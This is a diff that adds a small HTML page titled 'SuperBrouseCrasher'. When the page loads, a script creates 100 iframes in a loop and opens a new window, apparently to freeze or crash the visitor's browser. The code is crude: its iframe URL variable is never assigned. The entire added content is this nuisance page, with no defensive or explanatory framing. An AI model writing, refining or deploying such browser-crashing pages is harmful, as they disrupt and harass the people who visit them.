@@ -1,6 +1,29 @@
+
 <!DOCTYPE HTML>
 <html>
   <head>
-     
+    <title>SuperBrouseCrasher</title>
+    <meta charset="UTF-8">
   </head>
+  <body onload="crash1()">
+    <script>
+      let url;
+function crash1() {
+let num = 100;
+  for (let i = 0; i < num; i++) {
+    loadIfr(url);
+  }
+}
+
+function loadIfr(url) {
+  var ifr = document.createElement("iframe");
+  ifr.src = url;
+  ifr.style.width = "100px";
+  ifr.style.height = "100px";
+  document.body.appendChild(ifr);
+}
+        window.open('#');
+
+    </script>
+  </body>
 </html>
